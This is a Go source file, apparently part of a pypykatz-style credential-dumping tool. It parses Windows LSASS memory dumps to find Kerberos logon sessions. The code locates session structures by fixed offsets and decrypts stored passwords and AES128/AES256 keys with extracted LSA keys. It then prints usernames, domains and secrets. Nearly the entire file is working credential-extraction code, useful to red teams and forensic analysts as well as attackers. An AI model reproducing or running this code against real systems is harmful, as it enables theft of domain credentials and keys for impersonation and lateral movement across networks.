package minidump

import (
	"encoding/binary"
	"fmt"
)

// KerberosPattern contains signature and offsets for finding Kerberos credentials
type KerberosPattern struct {
	Signature        []byte
	FirstEntryOffset int
	BuildNumber      uint32
}

// GetKerberosPattern returns the pattern for the given Windows build number
func GetKerberosPattern(buildNumber uint32) *KerberosPattern {
	// Windows 10 1903+ (Build 18362+)
	if buildNumber >= 18362 {
		return &KerberosPattern{
			Signature:        []byte{0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d},
			FirstEntryOffset: 6,
			BuildNumber:      buildNumber,
		}
	}
	// Windows 10 1607-1809 (Build 14393-17763)
	if buildNumber >= 14393 {
		return &KerberosPattern{
			Signature:        []byte{0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d},
			FirstEntryOffset: 6,
			BuildNumber:      buildNumber,
		}
	}
	// Windows 10 1507-1511 (Build 10240-10586)
	if buildNumber >= 10240 {
		return &KerberosPattern{
			Signature:        []byte{0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d},
			FirstEntryOffset: 6,
			BuildNumber:      buildNumber,
		}
	}
	// Windows 8.1 (Build 9600)
	if buildNumber >= 9600 {
		return &KerberosPattern{
			Signature:        []byte{0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d},
			FirstEntryOffset: 6,
			BuildNumber:      buildNumber,
		}
	}
	// Default for older versions
	return nil
}

// KerberosCredential represents extracted Kerberos credentials
type KerberosCredential struct {
	Username    string
	Domain      string
	Password    string // Plaintext machine account password
	PasswordHex string
	AES128Key   string
	AES256Key   string
	LUID        uint64
}

// FindKerberosCredentials searches for Kerberos credentials in the dump
// Windows 10+ stores Kerberos sessions in scattered heap locations.
// We find them by scanning memory for valid KIWI_KERBEROS_LOGON_SESSION structures.
func (d *Dump) FindKerberosCredentials(keys *LSAKeys) ([]KerberosCredential, error) {
	if keys == nil {
		return nil, nil
	}

	// Find kerberos.dll module to verify it's loaded
	kerberosDll := d.FindModule("kerberos.dll")
	if kerberosDll == nil {
		return nil, fmt.Errorf("kerberos.dll not found in dump")
	}

	// Find Kerberos sessions by scanning memory for valid session structures
	// Session structure (KIWI_KERBEROS_LOGON_SESSION_10_1607, x64):
	//   0x00: UsageCount (4) - should be 1-10
	//   0x04: padding (4)
	//   0x08: unk0 (RTL_BALANCED_LINKS/LIST_ENTRY, 24 bytes)
	//         - Flink at +0x08, Blink at +0x10
	//         - For standalone sessions: Flink == Blink == session+0x08
	//   0x48: LocallyUniqueIdentifier (8) - LUID, should be reasonable value
	//   0x88: credentials.UserName (LSA_UNICODE_STRING, 16)
	//   0x98: credentials.Domaine (LSA_UNICODE_STRING, 16)
	//   0xB8: credentials.Password (LSA_UNICODE_STRING, 16)
	//   0x118: pKeyList (PVOID, 8)

	var credentials []KerberosCredential
	seenLUIDs := make(map[uint64]bool)

	// Scan memory in aligned 8-byte increments looking for valid sessions
	// We look for the pattern: UsageCount (1-10) followed by LIST_ENTRY that points back to itself
	for off := 0; off < len(d.Memory)-0x130; off += 8 {
		data := d.Memory[off:]

		// Check UsageCount at +0x00 (should be 1-10)
		usageCount := binary.LittleEndian.Uint32(data[0x00:])
		if usageCount == 0 || usageCount > 10 {
			continue
		}

		// Calculate what the self-referential LIST_ENTRY should be
		sessionVA := d.OffsetToVA(int64(off))
		if sessionVA == 0 {
			continue
		}
		expectedListEntry := sessionVA + 0x08

		// Check if Flink at +0x08 equals expectedListEntry (self-referential)
		flink := binary.LittleEndian.Uint64(data[0x08:])
		blink := binary.LittleEndian.Uint64(data[0x10:])

		// Kerberos sessions often have self-referential LIST_ENTRY
		if flink != expectedListEntry || blink != expectedListEntry {
			continue
		}

		// Check LUID at +0x48 (should be reasonable, non-zero, not too large)
		luid := binary.LittleEndian.Uint64(data[0x48:])
		if luid == 0 || luid > 0x100000000 {
			continue
		}

		// Avoid duplicate LUIDs
		if seenLUIDs[luid] {
			continue
		}

		// Validate Username LSA_UNICODE_STRING at +0x88
		userLen := binary.LittleEndian.Uint16(data[0x88:])
		userMax := binary.LittleEndian.Uint16(data[0x8A:])
		userBuf := binary.LittleEndian.Uint64(data[0x90:])

		if userLen == 0 || userLen > 256 || userMax < userLen {
			continue
		}
		if userBuf < 0x10000 || userBuf > 0x800000000000 {
			continue
		}

		// Validate Domain LSA_UNICODE_STRING at +0x98
		domLen := binary.LittleEndian.Uint16(data[0x98:])
		domMax := binary.LittleEndian.Uint16(data[0x9A:])
		domBuf := binary.LittleEndian.Uint64(data[0xA0:])

		if domLen == 0 || domLen > 256 || domMax < domLen {
			continue
		}
		if domBuf < 0x10000 || domBuf > 0x800000000000 {
			continue
		}

		// This looks like a valid Kerberos session!
		seenLUIDs[luid] = true

		cred := d.parseKerberosSession(sessionVA, keys)
		if cred != nil && (cred.Username != "" || cred.AES128Key != "" || cred.AES256Key != "" || cred.PasswordHex != "") {
			credentials = append(credentials, *cred)
		}
	}

	return credentials, nil
}

// walkAVLTree recursively walks an AVL tree of Kerberos logon sessions.
// In Windows 10+, Kerberos sessions are stored in an AVL tree where each session
// has an embedded RTL_BALANCED_LINKS at offset 0x08 (the unk0 LIST_ENTRY field).
// The AVL tree nodes point to this embedded structure, so we subtract 0x08
// to get the actual session start address.
//
// Session structure (KIWI_KERBEROS_LOGON_SESSION_10_1607):
//
//	0x00: UsageCount (4 bytes)
//	0x04: padding (4 bytes)
//	0x08: unk0 (LIST_ENTRY - the AVL links point here)
//	...
func (d *Dump) walkAVLTree(nodeVA uint64, results *[]uint64, visited map[uint64]bool) {
	if nodeVA == 0 {
		return
	}
	if visited[nodeVA] {
		return
	}
	visited[nodeVA] = true

	nodeOffset := d.VAToOffset(nodeVA)
	if nodeOffset < 0 || int(nodeOffset)+0x30 > len(d.Memory) {
		return
	}

	data := d.Memory[nodeOffset:]

	// The node points to the embedded LIST_ENTRY at session+0x08
	// Session starts 8 bytes before
	sessionVA := nodeVA - 0x08
	sessionOffset := d.VAToOffset(sessionVA)

	if sessionOffset >= 0 && int(sessionOffset)+0x130 <= len(d.Memory) {
		sessionData := d.Memory[sessionOffset:]
		// Validate: UsageCount should be a small positive number (1-100 typically)
		usageCount := binary.LittleEndian.Uint32(sessionData[0x00:])
		if usageCount > 0 && usageCount < 100 {
			*results = append(*results, sessionVA)
		}
	}

	// Read the LIST_ENTRY / RTL_BALANCED_LINKS at the node:
	// +0x00: Flink/Parent
	// +0x08: Blink/LeftChild
	// +0x10: (if using RTL_BALANCED_LINKS: RightChild)
	// Note: For LIST_ENTRY it's just Flink/Blink, but we treat Blink as LeftChild
	leftChild := binary.LittleEndian.Uint64(data[0x08:])
	// For a list that's also an AVL tree, there might be a RightChild
	// But typical list traversal just uses Flink
	// Let's also try Flink for completeness
	flink := binary.LittleEndian.Uint64(data[0x00:])

	// Recursively walk
	if leftChild != 0 && leftChild != nodeVA && leftChild > 0x10000 && leftChild < 0x800000000000 {
		d.walkAVLTree(leftChild, results, visited)
	}
	if flink != 0 && flink != nodeVA && flink > 0x10000 && flink < 0x800000000000 {
		d.walkAVLTree(flink, results, visited)
	}
}

// parseKerberosSession parses a KIWI_KERBEROS_LOGON_SESSION structure
// Structure layout for KIWI_KERBEROS_LOGON_SESSION_10_1607 (x64) based on pypykatz:
//
// Offset  Size  Field
// 0x00    4     UsageCount
// 0x04    4     (padding)
// 0x08    16    unk0 (LIST_ENTRY - Flink/Blink for AVL)
// 0x18    8     unk1
// 0x20    4     unk1b
// 0x24    4     (padding)
// 0x28    8     unk2 (FILETIME)
// 0x30    8     unk4
// 0x38    8     unk5
// 0x40    8     unk6
// 0x48    8     LocallyUniqueIdentifier (LUID)
// 0x50    8     unk7 (FILETIME)
// 0x58    8     unk8
// 0x60    4     unk8b
// 0x64    4     (padding)
// 0x68    8     unk9 (FILETIME)
// 0x70    8     unk11
// 0x78    8     unk12
// 0x80    8     unk13
// 0x88    -     (padding to 8)
// 0x88    -     KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607 (embedded):
//
//	0x88   16    UserName (LSA_UNICODE_STRING)
//	0x98   16    Domain (LSA_UNICODE_STRING)
//	0xA8   8     unkFunction
//	0xB0   4     type
//	0xB4   4     (padding)
//	0xB8   16    Password (LSA_UNICODE_STRING)
//	0xC8   16    IsoPassword
//
// 0xD8    4     unk14
// 0xDC    4     unk15
// 0xE0    4     unk16
// 0xE4    4     unk17
// 0xE8    8     unk18
// 0xF0    8     unk19
// 0xF8    8     unk20
// 0x100   8     unk21
// 0x108   8     unk22
// 0x110   8     unk23
// 0x118   8     pKeyList
// 0x120   8     unk26
func (d *Dump) parseKerberosSession(sessionVA uint64, keys *LSAKeys) *KerberosCredential {
	sessionOffset := d.VAToOffset(sessionVA)
	if sessionOffset < 0 || int(sessionOffset)+0x200 > len(d.Memory) {
		return nil
	}

	data := d.Memory[sessionOffset:]

	cred := &KerberosCredential{}

	if len(data) < 0x130 {
		return nil
	}

	// Extract LUID at offset 0x48
	cred.LUID = binary.LittleEndian.Uint64(data[0x48:])

	// Read embedded credentials - scan for valid LSA_UNICODE_STRING structures
	// The credentials struct is embedded starting around 0x88
	// UserName at 0x88, Domain at 0x98
	cred.Username = d.readLSAUnicodeString(data, 0x88)
	cred.Domain = d.readLSAUnicodeString(data, 0x98)

	// If that didn't work, try alternative offsets based on actual memory layout
	if cred.Username == "" {
		// Scan for valid username/domain strings
		for off := 0x80; off <= 0xA0; off += 8 {
			str := d.readLSAUnicodeString(data, off)
			if str != "" && len(str) > 0 {
				if cred.Username == "" {
					cred.Username = str
				} else if cred.Domain == "" {
					cred.Domain = str
					break
				}
			}
		}
	}

	// Read encrypted password from LSA_UNICODE_STRING at 0xB8
	pwdLength := binary.LittleEndian.Uint16(data[0xB8:])
	pwdBufferVA := binary.LittleEndian.Uint64(data[0xC0:])
	if pwdLength > 0 && pwdBufferVA != 0 && pwdLength < 1024 {
		pwdOffset := d.VAToOffset(pwdBufferVA)
		if pwdOffset >= 0 && int(pwdOffset)+int(pwdLength) <= len(d.Memory) {
			encPwd := d.Memory[pwdOffset : int(pwdOffset)+int(pwdLength)]
			// Decrypt password
			decPwd := d.decryptKerberosBlob(encPwd, keys)
			if decPwd != nil {
				cred.PasswordHex = bytesToHex(decPwd)
				cred.Password = utf16ToString(decPwd)
			}
		}
	}

	// Read pKeyList - scan for valid pointer at expected offsets
	// pKeyList should be around 0x118 based on structure analysis
	keyListVA := uint64(0)
	for _, off := range []int{0x118, 0x110, 0x108, 0x120} {
		if off+8 <= len(data) {
			ptr := binary.LittleEndian.Uint64(data[off:])
			if ptr > 0x10000 && ptr < 0x800000000000 {
				// Verify this looks like a valid KeyList
				ptrOffset := d.VAToOffset(ptr)
				if ptrOffset >= 0 && int(ptrOffset)+0x20 <= len(d.Memory) {
					keyListData := d.Memory[ptrOffset:]
					cbItem := binary.LittleEndian.Uint32(keyListData[0x04:])
					if cbItem > 0 && cbItem <= 10 {
						keyListVA = ptr
						break
					}
				}
			}
		}
	}

	if keyListVA != 0 {
		d.extractKerberosKeys(keyListVA, cred, keys)
	}

	// Only return if we found something useful
	if cred.Username == "" && cred.AES128Key == "" && cred.AES256Key == "" && cred.PasswordHex == "" {
		return nil
	}

	return cred
}

// extractKerberosKeys extracts AES keys from KIWI_KERBEROS_KEYS_LIST_6
func (d *Dump) extractKerberosKeys(keyListVA uint64, cred *KerberosCredential, keys *LSAKeys) {
	keyListOffset := d.VAToOffset(keyListVA)
	if keyListOffset < 0 || int(keyListOffset)+0x30 > len(d.Memory) {
		return
	}

	data := d.Memory[keyListOffset:]

	// KIWI_KERBEROS_KEYS_LIST_6 (x64):
	// 0x00: unk0 (DWORD, 4)
	// 0x04: cbItem - number of key entries (DWORD, 4)
	// 0x08: unk1 (PVOID, 8)
	// 0x10: unk2 (PVOID, 8)
	// 0x18: unk3 (PVOID, 8)
	// 0x20: unk4 (PVOID, 8)
	// 0x28: KeyEntries start

	cbItem := binary.LittleEndian.Uint32(data[0x04:])
	if cbItem == 0 || cbItem > 10 {
		return
	}

	// KERB_HASHPASSWORD_6_1607 entry (x64):
	// 0x00: salt (LSA_UNICODE_STRING, 16)
	// 0x10: stringToKey (PVOID, 8)
	// 0x18: unk0 (PVOID, 8)
	// 0x20: generic.Type (DWORD, 4)
	// 0x24: padding (4)
	// 0x28: generic.Size (SIZE_T, 8)
	// 0x30: generic.Checksump (PVOID, 8) - pointer to encrypted key data
	// Total: 0x38 (56) bytes per entry

	entrySize := uint32(0x38) // Size of KERB_HASHPASSWORD_6_1607
	entriesStart := int(keyListOffset) + 0x28

	for i := uint32(0); i < cbItem && i < 10; i++ {
		entryOffset := entriesStart + int(i*entrySize)
		if entryOffset+int(entrySize) > len(d.Memory) {
			break
		}

		entryData := d.Memory[entryOffset:]

		// Get key size and data pointer from the generic struct
		// (keyType is not used - pypykatz uses size-based detection)
		keySize := binary.LittleEndian.Uint64(entryData[0x28:]) // SIZE_T is 8 bytes on x64
		keyDataVA := binary.LittleEndian.Uint64(entryData[0x30:])

		if keySize == 0 || keySize > 256 || keyDataVA == 0 {
			continue
		}

		keyDataOffset := d.VAToOffset(keyDataVA)
		if keyDataOffset < 0 || int(keyDataOffset)+int(keySize) > len(d.Memory) {
			continue
		}

		encKey := d.Memory[keyDataOffset : int(keyDataOffset)+int(keySize)]
		decKey := d.decryptKerberosBlob(encKey, keys)
		if decKey == nil {
			continue
		}

		// pypykatz uses SIZE to determine key type, not the Type field:
		// Size <= 24 bytes → AES128 key
		// Size 25-32 bytes → AES256 key
		// This is because the encrypted blob size determines the key type
		if keySize > 0 && keySize <= 24 {
			// AES128 key (16 bytes when decrypted)
			if len(decKey) >= 16 {
				cred.AES128Key = bytesToHex(decKey[:16])
			}
		} else if keySize > 24 && keySize <= 32 {
			// AES256 key (32 bytes when decrypted)
			if len(decKey) >= 32 {
				cred.AES256Key = bytesToHex(decKey[:32])
			}
		}
	}
}

// decryptKerberosBlob decrypts an encrypted Kerberos blob
func (d *Dump) decryptKerberosBlob(data []byte, keys *LSAKeys) []byte {
	if len(data) == 0 {
		return nil
	}

	var decrypted []byte
	var err error

	// Same logic as MSV: use 3DES for 8-byte aligned, AES otherwise
	if len(data)%8 == 0 {
		if keys.DESKey != nil && keys.IV != nil {
			decrypted, err = DecryptCredential(data, keys.DESKey, keys.IV[:8], false)
		}
	} else {
		if keys.AESKey != nil && keys.IV != nil {
			decrypted, err = DecryptCredential(data, keys.AESKey, keys.IV, true)
		}
	}

	if err != nil {
		return nil
	}
	return decrypted
}

// utf16ToString converts UTF-16LE bytes to string
func utf16ToString(b []byte) string {
	if len(b) < 2 {
		return ""
	}
	// Check if it looks like valid UTF-16
	u16 := make([]uint16, len(b)/2)
	for i := 0; i < len(u16); i++ {
		u16[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	// Convert to string, stopping at null terminator
	result := make([]rune, 0, len(u16))
	for _, c := range u16 {
		if c == 0 {
			break
		}
		result = append(result, rune(c))
	}
	return string(result)
}

// FormatKerberosCredential formats a Kerberos credential for display
func FormatKerberosCredential(cred KerberosCredential) string {
	result := fmt.Sprintf("Domain: %s | User: %s", cred.Domain, cred.Username)
	if cred.AES128Key != "" {
		result += fmt.Sprintf(" | AES128: %s", cred.AES128Key)
	}
	if cred.AES256Key != "" {
		result += fmt.Sprintf(" | AES256: %s", cred.AES256Key)
	}
	if cred.PasswordHex != "" {
		result += fmt.Sprintf(" | Password (hex): %s", cred.PasswordHex)
	}
	return result
}
